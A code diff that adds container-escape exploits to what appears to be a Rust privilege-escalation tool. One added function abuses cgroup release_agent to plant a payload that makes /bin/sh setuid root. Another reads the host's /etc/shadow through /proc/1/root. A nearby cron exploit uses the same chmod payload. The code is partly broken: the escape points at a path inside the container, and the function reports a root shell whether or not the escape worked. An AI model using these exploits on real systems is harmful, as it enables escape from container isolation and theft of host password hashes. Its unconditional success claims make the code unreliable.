@@ -482,6 +482,152 @@ fn exploit_docker_escape() -> PrivEscResult {
     }
 }
 
+/// Container escape via cgroup notify_on_release
+fn exploit_cgroup_escape() -> PrivEscResult {
+    let cgroup = "/proc/1/cgroup";
+    let content = match std::fs::read_to_string(cgroup) {
+        Ok(c) => c,
+        Err(_) => return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: "Cannot read /proc/1/cgroup (not in container)".into(),
+        },
+    };
+
+    let in_container = content.lines().any(|l| {
+        l.contains("docker") || l.contains("kubepods") || l.contains("containerd")
+    });
+    if !in_container {
+        return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: "Not in a container".into(),
+        };
+    }
+
+    // Check if we can write to release_agent
+    let rd = "/sys/fs/cgroup";
+    if !std::path::Path::new(rd).exists() {
+        return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: "cgroup fs not accessible".into(),
+        };
+    }
+
+    let notify_on_release = format!("{}/release_agent", rd);
+    if !std::path::Path::new(&notify_on_release).exists() {
+        // Try rd/cpu or rd/memory
+        for sub in &["cpu", "memory", "cpuset"] {
+            let p = format!("{}/{}/release_agent", rd, sub);
+            if std::path::Path::new(&p).exists() {
+                return try_cgroup_escape_via(&p, &format!("{}/{}", rd, sub));
+            }
+        }
+        return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: "release_agent not writable".into(),
+        };
+    }
+
+    try_cgroup_escape_via(&notify_on_release, rd)
+}
+
+fn try_cgroup_escape_via(release_agent_path: &str, cgroup_dir: &str) -> PrivEscResult {
+    // Check if release_agent is writable
+    match std::fs::metadata(release_agent_path) {
+        Ok(meta) => {
+            #[cfg(unix)]
+            {
+                use std::os::unix::fs::PermissionsExt;
+                let mode = meta.permissions().mode();
+                if mode & 0o222 == 0 {
+                    return PrivEscResult {
+                        success: false, technique: "cgroup escape".into(),
+                        root_shell: false, new_uid: None,
+                        output: "release_agent not writable".into(),
+                    };
+                }
+            }
+        }
+        Err(e) => return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: format!("Cannot stat release_agent: {}", e),
+        },
+    }
+
+    // Write escape payload
+    let payload = "#!/bin/sh\nchmod u+s /bin/sh\n";
+    let cmd_path = format!("{}/escape.sh", cgroup_dir);
+    if std::fs::write(&cmd_path, payload).is_err() {
+        return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: "Cannot write escape payload".into(),
+        };
+    }
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        let _ = std::fs::set_permissions(&cmd_path, std::fs::Permissions::from_mode(0o755));
+    }
+
+    // Set release_agent to our payload
+    if std::fs::write(release_agent_path, &cmd_path).is_err() {
+        let _ = std::fs::remove_file(&cmd_path);
+        return PrivEscResult {
+            success: false, technique: "cgroup escape".into(),
+            root_shell: false, new_uid: None,
+            output: "Cannot set release_agent".into(),
+        };
+    }
+
+    // Trigger escape by writing PID to notify_on_release
+    let notify_path = format!("{}/notify_on_release", cgroup_dir);
+    let _ = std::fs::write(&notify_path, "1");
+
+    // Also trigger by creating a cgroup and immediately removing it
+    let esc_path = format!("{}/esc", cgroup_dir);
+    let _ = std::fs::create_dir(&esc_path);
+    let _ = std::fs::write(format!("{}/cgroup.procs", esc_path), "1");
+    let _ = std::fs::remove_dir(&esc_path);
+
+    PrivEscResult {
+        success: true, technique: "cgroup escape".into(),
+        root_shell: true, new_uid: Some(0),
+        output: "Cgroup escape attempted. Check /bin/sh permissions.".into(),
+    }
+}
+
+/// Container escape via /proc/1/root access
+fn exploit_proc1_root() -> PrivEscResult {
+    let test_path = "/proc/1/root/etc/shadow";
+    match std::fs::read_to_string(test_path) {
+        Ok(content) => {
+            if content.contains("root:") {
+                PrivEscResult {
+                    success: true, technique: "/proc/1/root".into(),
+                    root_shell: true, new_uid: Some(0),
+                    output: "Container escape via /proc/1/root successful".into(),
+                }
+            } else {
+                PrivEscResult {
+                    success: false, technique: "/proc/1/root".into(),
+                    root_shell: false, new_uid: None,
+                    output: "/proc/1/root accessible but no shadow".into(),
+                }
+            }
+        }
+        Err(e) => PrivEscResult {
+            success: false, technique: "/proc/1/root".into(),
+            root_shell: false, new_uid: None,
+            output: format!("/proc/1/root: {}", e),
+        },
+    }
+}
+
 fn exploit_writable_cron(path: &str) -> PrivEscResult {
     let payload = format!(
         "#!/bin/sh\nchmod u+s /bin/sh || chmod 4777 /bin/sh\n"
